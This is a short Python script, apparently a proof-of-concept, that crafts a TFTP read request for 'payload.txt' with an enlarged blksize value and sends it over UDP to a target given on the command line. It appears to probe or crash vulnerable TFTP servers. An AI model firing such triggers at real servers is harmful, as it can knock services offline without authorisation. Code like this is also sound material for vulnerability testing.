import socket
import sys


def create_tftp_rrq(filename, mode="netascii", blksize=61312):

    opcode = b'\x00\x01'
    
    filename_bytes = filename.encode('ascii') + b'\x00'
    mode_bytes = mode.encode('ascii') + b'\x00'
    

    blksize_option = b'blksize\x00'
    blksize_value = str(blksize).encode('ascii') + b'\x00'
    
    #TFTP RQ packet
    rrq_packet = opcode + filename_bytes + mode_bytes + blksize_option + blksize_value
    return rrq_packet

def send_tftp_rrq(rrq_packet, server_ip, server_port=69):

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    try:
        sock.sendto(rrq_packet, (server_ip, server_port))
        print(f"Sent RRQ packet to {server_ip}:{server_port}")
    except Exception as e:
        print(f"Error sending RRQ packet: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    target = sys.argv[1]
    server_ip = target
    #"192.168.212.40"  
    filename ="payload.txt"
 
    rrq_packet = create_tftp_rrq(filename, blksize=61312)
 
    send_tftp_rrq(rrq_packet, server_ip)
